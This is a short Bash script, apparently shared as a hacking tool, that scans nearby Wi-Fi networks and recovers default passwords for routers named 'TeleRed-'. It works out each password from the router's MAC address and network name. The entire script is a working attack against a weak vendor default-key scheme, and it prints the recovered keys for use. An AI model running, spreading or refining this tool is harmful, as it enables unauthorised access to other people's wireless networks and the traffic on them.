#!/bin/bash
# Buscara password por defecto de las redes telered 

interface=wlan0

#Colours
greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"

trap ctrl_c INT

function ctrl_c(){
    echo -e "${redColour}\n\n[*] Saliendo con CTRL+C ${endColour}"
    tput cnorm # coloco el cursor
    exit 1
}


function logo(){
echo -e "${turqouiseColour}"'  
 _______    _        ______            _     ______                   
(_______)  | |      (_____ \          | |   / _____)                  
    _ _____| | _____ _____) )_____  __| |  ( (____   ____ _____ ____  
   | | ___ | || ___ |  __  /| ___ |/ _  |   \____ \ / ___|____ |  _ \ 
   | | ____| || ____| |  \ \| ____( (_| |   _____) | (___/ ___ | | | |
   |_|_____)\_)_____)_|   |_|_____)\____|  (______/ \____)_____|_| |_| '" ${blueColour}

                 TeleRed   Wifi   Password   Defaults            (v0.1)    ${yellowColour}
                                                            by phr4Nt0m   ${purpleColour} 
-----------------------------------------------------------------------\n ${endColour}" 
}

function scan() {
    tput civis 
    touch .list

    for i in $(iwlist $interface scan | grep -E  'Address|ESSID' | sed 's/:/\//'| tr '"' ' ' | cut -d"/" -f2 | tac); do
        echo "$i" >> .list
    done
    mac=0
    for x in $(cat .list); do

    # revisa y extrae datos de la  BSSID (MAC) e imprime  
        if [ $mac -eq "1" ]; then
            pass1=$(echo "$x" | cut -d":" -f2-4 |sed 's/://g')
            let mac=0
            echo -e "           Password:\t${redColour}$pass1$pass2${endColour} \n "
            # echo -e "----------------------------------------------\n"
        fi

    # checkea si es de TeleRed 
        echo "$x" | grep "TeleRed-" >/dev/null
    # Extrae datos de la ESSID
        if [ $? -eq "0" ]; then
            pass2=$(echo "$x" | cut -d"-" -f2)
            #echo -e "----------------------------------------------" 
            echo -e "           ESSID :\t${redColour}$x ${endColour}"    
            mac=1
        fi

    done
    rm .list
    tput cnorm
    echo -e "${purpleColour}-----------------------------------------------------------------------${endColour}" 
}


logo

if [ "$(id -u)" == "0" ]; then 
    scan

else
    echo -e "${yellowColour} Necesitas ser root para ejecutarlo!!! ${endColour}"
fi
